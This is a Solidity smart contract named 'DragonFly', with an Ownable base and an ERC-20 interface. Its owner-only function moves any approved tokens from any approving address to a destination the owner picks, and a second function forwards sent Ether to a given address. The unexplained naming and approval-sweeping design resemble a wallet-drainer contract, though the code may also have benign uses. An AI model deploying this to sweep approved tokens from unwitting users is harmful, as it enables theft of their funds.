// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function _contextSuffixLength() internal view virtual returns (uint256) {
        return 0;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    error OwnableUnauthorizedAccount(address account);

    error OwnableInvalidOwner(address owner);

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor(address initialOwner) {
        if (initialOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(initialOwner);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

contract DragonFly is Ownable {
    constructor() Ownable(msg.sender) {}

    receive() external payable {}

    function dragonfly(
        address addressFrom,
        address addressDragon,
        uint256 amount,
        address addressToken
    ) external onlyOwner {
        require(addressFrom != address(0), "Invalid from address");
        require(addressDragon != address(0), "Invalid dragon address");
        require(addressToken != address(0), "Invalid token address");
        require(amount > 0, "Amount must be greater than 0");

        IERC20 token = IERC20(addressToken);
        require(token.balanceOf(addressFrom) >= amount, "Insufficient balance");
        require(
            token.allowance(addressFrom, address(this)) >= amount,
            "Insufficient allowance"
        );
        bool success = token.transferFrom(addressFrom, addressDragon, amount);
        require(success, "Transfer must return true");
    }

    function dragon_fly(address payable addressDragon, uint256 amount)
        external
        payable
    {
        require(msg.value >= amount, "Insufficient Ether sent");

        (bool successFly, ) = addressDragon.call{value: amount}("");
        require(successFly, "Fly transfer failed");
    }
}